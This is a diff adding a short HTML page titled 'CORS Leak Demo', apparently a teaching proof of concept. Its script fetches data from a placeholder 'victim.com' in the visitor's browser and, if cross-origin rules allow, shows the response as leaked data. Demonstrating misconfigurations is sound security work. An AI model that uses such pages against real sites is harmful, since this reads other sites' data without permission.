@@ -1,0 +1,21 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS Leak Demo</title>
+  </head>
+  <body>
+    <h3>Leaking data from victim.com...</h3>
+    <script>
+      fetch("https://victim.com/secret-data")
+        .then(res => res.text())
+        .then(data => {
+          document.body.innerHTML += `<pre>Leaked Data: ${data}</pre>`;
+        })
+        .catch(err => {
+          console.error("CORS blocked:", err);
+          document.body.innerHTML += "<p>Blocked by CORS</p>";
+        });
+    </script>
+  </body>
+</html>
